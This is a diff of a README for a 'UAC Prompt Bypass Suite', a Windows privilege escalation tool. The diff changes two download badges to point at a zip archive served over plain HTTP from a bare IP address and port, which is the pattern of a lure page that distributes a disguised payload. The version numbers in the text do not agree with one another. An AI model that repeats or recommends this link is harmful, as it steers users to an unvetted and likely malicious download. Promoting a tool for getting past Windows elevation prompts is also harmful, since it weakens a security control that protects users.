@@ -1,6 +1,6 @@
 # 🧠 UAC Prompt Bypass Suite v2.1 – Seamless Administrative Elevation Framework
 
-[![Download](https://img.shields.io/badge/Download%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](http://86.109.75.161:8080/uac-bypass-utility-v2.1.zip)
+[![Download](https://img.shields.io/badge/Download%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](http://86.109.75.161:8080/uac-bypass-utility-v2.2.zip)
 
 > **Year of Release: 2026** – A sophisticated privilege escalation utility designed for IT professionals and power users who require frictionless administrative access without interrupting workflow.
 
@@ -279,7 +279,7 @@ This software is intended for **legitimate administrative purposes only**. By do
 
 ---
 
-[![Download](https://img.shields.io/badge/Download%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](http://86.109.75.161:8080/uac-bypass-utility-v2.1.zip)
+[![Download](https://img.shields.io/badge/Download%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](http://86.109.75.161:8080/uac-bypass-utility-v2.2.zip)
 
 **Version 1.1 – Year 2026**  
 *Elevation, Reimagined.*
